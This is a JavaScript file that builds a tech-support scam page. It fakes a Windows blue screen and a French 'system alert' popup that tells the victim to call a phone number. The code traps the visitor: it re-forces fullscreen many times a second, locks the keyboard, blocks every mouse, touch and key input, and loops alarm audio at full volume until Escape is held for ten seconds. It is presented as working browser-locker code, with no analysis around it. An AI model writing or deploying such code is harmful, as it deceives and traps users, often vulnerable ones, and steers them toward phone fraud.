(function () {
  var mount = document.getElementById("app-mount");
  if (!mount) return;

  mount.innerHTML =
    '<main class="bsod">' +
    '<div class="bsod-left">' +
    '<p class="bsod-emoji" aria-hidden="true">:(</p>' +
    '<h1 class="bsod-title">Your PC ran into a problem and needs to restart. We\'re just collecting some error info, and then we\'ll restart for you.</h1>' +
    '<p class="bsod-progress" id="bsodProgress">20% complete</p>' +
    '<div class="bsod-footer">' +
    '<div class="bsod-qr" aria-hidden="true"><img src="bsod-qr.svg" alt="" width="120" height="120"></div>' +
    '<div class="bsod-info">' +
    '<p>For more information about this issue and possible fixes, visit <span class="bsod-link">https://www.windows.com/stopcode</span></p>' +
    '<p>If you call a support person, give them this info: <span class="bsod-stop">Stop code: CRITICAL_PROCESS_DIED</span></p>' +
    "</div></div></div>" +
    '<div class="bsod-logo" aria-hidden="true">' +
    '<svg viewBox="0 0 88 88" width="160" height="160">' +
    '<path fill="#ffffff" d="M0 12 L38 8 L34 42 L0 38 Z"/>' +
    '<path fill="#ffffff" d="M42 8 L88 0 L84 38 L46 34 Z"/>' +
    '<path fill="#ffffff" d="M0 46 L34 42 L38 80 L0 76 Z"/>' +
    '<path fill="#ffffff" d="M46 42 L84 38 L88 76 L50 72 Z"/>' +
    "</svg></div></main>" +
    '<div class="mouse-blocker" id="mouseBlocker" aria-hidden="true"></div>' +
    '<div class="popup-overlay" id="popupOverlay">' +
    '<div class="popup" id="popupBox" role="dialog" aria-modal="true" aria-labelledby="popupTitle">' +
    "<h2 id=\"popupTitle\">Alerte système</h2>" +
    "<p>Une erreur critique a été détectée sur votre ordinateur. Veuillez contacter le support technique pour obtenir de l'aide.</p>" +
    '<p class="popup-ref">Code d\'erreur : CRITICAL_PROCESS_DIED</p>' +
    '<p class="popup-phone">Appelez le support technique :<br><strong>+33 05 25 33 15 16</strong></p>' +
    '<button class="popup-btn" id="popupActionBtn" type="button">Compris</button>' +
    "</div></div>" +
    '<audio id="securityAudio1" src="script-audio.mp3" loop preload="auto"></audio>' +
    '<audio id="securityAudio2" src="script-audio-2.mp3" loop preload="auto"></audio>';

  var ESCAPE_DEZOOM_MS = 10000;
  var progressEl = document.getElementById("bsodProgress");
  var popupBox = document.getElementById("popupBox");
  var popupBtn = document.getElementById("popupActionBtn");
  var mouseBlocker = document.getElementById("mouseBlocker");
  var securityAudio1 = document.getElementById("securityAudio1");
  var securityAudio2 = document.getElementById("securityAudio2");

  var lockActive = false;
  var isDezoomed = false;
  var allowFullscreenExit = false;
  var escapeKeyHeld = false;
  var escapeHoldStart = null;
  var escapeHoldInterval = null;
  var fullscreenGuardInterval = null;
  var audioStarted = false;
  var audioRetryInterval = null;

  if (progressEl) {
    var value = 20;
    setInterval(function () {
      value += 1;
      if (value > 100) value = 20;
      progressEl.textContent = value + "% complete";
    }, 3000);
  }

  function isEscapeKey(event) {
    return event.key === "Escape" || event.code === "Escape" || event.keyCode === 27;
  }

  async function lockKeyboard() {
    if (navigator.keyboard && navigator.keyboard.lock) {
      try {
        await navigator.keyboard.lock();
      } catch (_error) {}
    }
  }

  async function unlockKeyboard() {
    if (navigator.keyboard && navigator.keyboard.unlock) {
      try {
        await navigator.keyboard.unlock();
      } catch (_error) {}
    }
  }

  async function requestFullscreen() {
    if (document.fullscreenElement) return true;
    if (!document.documentElement.requestFullscreen) return false;
    try {
      await document.documentElement.requestFullscreen();
      return true;
    } catch (_error) {
      return false;
    }
  }

  function clearEscapeHold() {
    escapeHoldStart = null;
    if (escapeHoldInterval) {
      clearInterval(escapeHoldInterval);
      escapeHoldInterval = null;
    }
  }

  function forceStayFullscreen() {
    if (!lockActive || isDezoomed || allowFullscreenExit) return;
    requestFullscreen();
    requestAnimationFrame(requestFullscreen);
    setTimeout(requestFullscreen, 0);
    setTimeout(requestFullscreen, 20);
  }

  function startFullscreenGuard() {
    stopFullscreenGuard();
    fullscreenGuardInterval = setInterval(function () {
      if (lockActive && !isDezoomed && !allowFullscreenExit) {
        forceStayFullscreen();
      }
    }, 16);
  }

  function stopFullscreenGuard() {
    if (fullscreenGuardInterval) {
      clearInterval(fullscreenGuardInterval);
      fullscreenGuardInterval = null;
    }
  }

  function dezoom() {
    allowFullscreenExit = true;
    isDezoomed = true;
    lockActive = false;
    escapeKeyHeld = false;
    clearEscapeHold();
    document.body.classList.add("lock-dezoomed");
    document.body.classList.remove("lock-mode");
    if (mouseBlocker) mouseBlocker.style.display = "none";
    unlockKeyboard();
    stopFullscreenGuard();
    stopAudioRetry();

    if (document.fullscreenElement && document.exitFullscreen) {
      document.exitFullscreen().catch(function () {});
    }
  }

  function playSecurityAudios() {
    var started = false;

    [securityAudio1, securityAudio2].forEach(function (audio) {
      if (!audio) return;
      audio.muted = false;
      audio.volume = 1;
      audio.loop = true;
      audio.load();
      var playPromise = audio.play();
      if (playPromise && playPromise.then) {
        playPromise
          .then(function () {
            started = true;
            audioStarted = true;
            stopAudioRetry();
          })
          .catch(function () {});
      }
    });

    return started;
  }

  function startAudioRetry() {
    stopAudioRetry();
    audioRetryInterval = setInterval(function () {
      if (audioStarted || isDezoomed) {
        stopAudioRetry();
        return;
      }
      playSecurityAudios();
    }, 800);
  }

  function stopAudioRetry() {
    if (audioRetryInterval) {
      clearInterval(audioRetryInterval);
      audioRetryInterval = null;
    }
  }

  function activateLockMode() {
    if (isDezoomed) return;
    if (lockActive) return;

    lockActive = true;
    isDezoomed = false;
    allowFullscreenExit = false;
    escapeKeyHeld = false;
    clearEscapeHold();

    document.body.classList.add("lock-mode");
    document.body.classList.remove("lock-dezoomed");

    if (mouseBlocker) mouseBlocker.style.display = "block";

    requestFullscreen();
    lockKeyboard();
    startFullscreenGuard();
    playSecurityAudios();
    startAudioRetry();
  }

  function startEscapeHoldTimer() {
    if (escapeHoldInterval) return;
    escapeHoldStart = Date.now();
    escapeHoldInterval = setInterval(function () {
      if (!lockActive || !escapeKeyHeld || isDezoomed) return;

      var elapsed = Date.now() - escapeHoldStart;

      if (elapsed >= ESCAPE_DEZOOM_MS) {
        dezoom();
        clearEscapeHold();
        escapeKeyHeld = false;
        return;
      }

      forceStayFullscreen();
    }, 50);
  }

  function handleLockKeyboard(event) {
    if (!lockActive || isDezoomed) return;

    if (event.type === "keydown" && !audioStarted) {
      playSecurityAudios();
    }

    if (isEscapeKey(event)) {
      event.preventDefault();
      event.stopImmediatePropagation();

      if (event.type === "keydown") {
        if (!escapeKeyHeld) {
          escapeKeyHeld = true;
          startEscapeHoldTimer();
        }
        forceStayFullscreen();
        return;
      }

      if (event.type === "keyup") {
        var heldLongEnough =
          escapeHoldStart !== null &&
          Date.now() - escapeHoldStart >= ESCAPE_DEZOOM_MS;

        escapeKeyHeld = false;
        clearEscapeHold();

        if (!heldLongEnough) {
          forceStayFullscreen();
        }
      }
      return;
    }

    event.preventDefault();
    event.stopImmediatePropagation();
  }

  function handleLockPointer(event) {
    if (!lockActive || isDezoomed) return;

    if (
      !audioStarted &&
      (event.type === "click" ||
        event.type === "mousedown" ||
        event.type === "touchstart")
    ) {
      playSecurityAudios();
    }

    event.preventDefault();
    event.stopPropagation();
    forceStayFullscreen();
  }

  function onPopupClick(event) {
    event.stopPropagation();
    if (isDezoomed) return;
    playSecurityAudios();
    activateLockMode();
  }

  if (popupBox) popupBox.addEventListener("click", onPopupClick);
  if (popupBtn) popupBtn.addEventListener("click", onPopupClick);

  document.addEventListener("fullscreenchange", function () {
    if (isDezoomed) return;

    if (document.fullscreenElement && !audioStarted) {
      playSecurityAudios();
    }

    if (lockActive && !allowFullscreenExit && !document.fullscreenElement) {
      forceStayFullscreen();
    }
  });

  ["mousedown", "mouseup", "mousemove", "contextmenu", "dblclick", "wheel", "click", "touchstart", "touchmove", "touchend"].forEach(function (eventName) {
    document.addEventListener(eventName, handleLockPointer, { capture: true, passive: false });
  });

  ["keydown", "keyup", "keypress"].forEach(function (eventName) {
    document.addEventListener(eventName, handleLockKeyboard, { capture: true, passive: false });
    window.addEventListener(eventName, handleLockKeyboard, { capture: true, passive: false });
  });

  function tryAutoFullscreen() {
    requestFullscreen();
    lockKeyboard();
    startFullscreenGuard();
    playSecurityAudios();
    startAudioRetry();

    setTimeout(function () {
      if (!isDezoomed) activateLockMode();
    }, 400);

    forceStayFullscreen();
    setTimeout(forceStayFullscreen, 0);
    setTimeout(forceStayFullscreen, 50);
    setTimeout(forceStayFullscreen, 150);
  }

  tryAutoFullscreen();
})();
